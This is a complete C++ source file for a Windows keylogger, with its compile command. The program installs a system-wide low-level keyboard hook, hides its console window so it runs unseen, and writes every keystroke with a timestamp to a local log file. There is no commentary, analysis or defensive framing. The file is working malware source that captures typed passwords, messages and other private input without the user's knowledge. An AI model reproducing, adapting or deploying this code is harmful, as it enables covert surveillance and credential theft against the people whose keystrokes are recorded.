// g++ keylogger.cpp -o keylogger.exe -lgdi32

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <unordered_map>
#include <string>
#include <ctime>

// Global log file
std::ofstream logFile;

// Function to get the current timestamp
std::string GetTimestamp() {
    std::time_t now = std::time(nullptr);
    char buf[100];
    strftime(buf, sizeof(buf), "[%Y-%m-%d %H:%M:%S]", std::localtime(&now));
    return std::string(buf);
}

// Function to map virtual key codes to human-readable descriptions
std::string GetKeyName(DWORD vkCode) {
    static const std::unordered_map<DWORD, std::string> keyMap = {
        {VK_LBUTTON, "Left Mouse Button"}, {VK_RBUTTON, "Right Mouse Button"},
        {VK_CANCEL, "Control-Break Processing"}, {VK_MBUTTON, "Middle Mouse Button"},
        {VK_BACK, "Backspace"}, {VK_TAB, "Tab"}, {VK_RETURN, "Enter"},
        {VK_SHIFT, "Shift"}, {VK_CONTROL, "Control"}, {VK_MENU, "Alt"},
        {VK_PAUSE, "Pause"}, {VK_CAPITAL, "Caps Lock"}, {VK_ESCAPE, "Escape"},
        {VK_SPACE, "Space"}, {VK_END, "End"}, {VK_HOME, "Home"},
        {VK_LEFT, "Left Arrow"}, {VK_UP, "Up Arrow"}, {VK_RIGHT, "Right Arrow"},
        {VK_DOWN, "Down Arrow"}, {VK_INSERT, "Insert"}, {VK_DELETE, "Delete"},
        {VK_LWIN, "Left Windows Key"}, {VK_RWIN, "Right Windows Key"},
        {VK_NUMPAD0, "Numpad 0"}, {VK_NUMPAD1, "Numpad 1"}, {VK_NUMPAD2, "Numpad 2"},
        {VK_NUMPAD3, "Numpad 3"}, {VK_NUMPAD4, "Numpad 4"}, {VK_NUMPAD5, "Numpad 5"},
        {VK_NUMPAD6, "Numpad 6"}, {VK_NUMPAD7, "Numpad 7"}, {VK_NUMPAD8, "Numpad 8"},
        {VK_NUMPAD9, "Numpad 9"}, {VK_MULTIPLY, "Numpad *"}, {VK_ADD, "Numpad +"},
        {VK_SUBTRACT, "Numpad -"}, {VK_DECIMAL, "Numpad ."}, {VK_DIVIDE, "Numpad /"},
        {VK_F1, "F1"}, {VK_F2, "F2"}, {VK_F3, "F3"}, {VK_F4, "F4"},
        {VK_F5, "F5"}, {VK_F6, "F6"}, {VK_F7, "F7"}, {VK_F8, "F8"},
        {VK_F9, "F9"}, {VK_F10, "F10"}, {VK_F11, "F11"}, {VK_F12, "F12"},
        {VK_NUMLOCK, "Num Lock"}, {VK_SCROLL, "Scroll Lock"},
    };

    if (vkCode >= 0x30 && vkCode <= 0x39) { // Numbers 0-9
        return std::string(1, char(vkCode));
    } else if (vkCode >= 0x41 && vkCode <= 0x5A) { // Letters A-Z
        return std::string(1, char(vkCode));
    }

    auto it = keyMap.find(vkCode);
    return (it != keyMap.end()) ? it->second : "Unknown Key (" + std::to_string(vkCode) + ")";
}

// Callback function for the keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        // Log the key press with a timestamp
        std::string keyName = GetKeyName(vkCode);
        logFile << GetTimestamp() << " Key Pressed: " << keyName << " (Code: " << vkCode << ")" << std::endl;
        logFile.flush();  // Ensure data is written to the file immediately
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to detach the console window
void DetachConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE); // Hide the console window
}

int main() {
    // Open log file in append mode
    logFile.open("keylog.txt", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file." << std::endl;
        return 1;
    }

    // Detach the console to make the application run in the background
    DetachConsole();

    // Set the low-level keyboard hook
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    if (hhkLowLevelKybd == NULL) {
        std::cerr << "Failed to set hook." << std::endl;
        return 1;
    }

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up: unhook and close the log file
    UnhookWindowsHookEx(hhkLowLevelKybd);
    logFile.close();
    return 0;
}
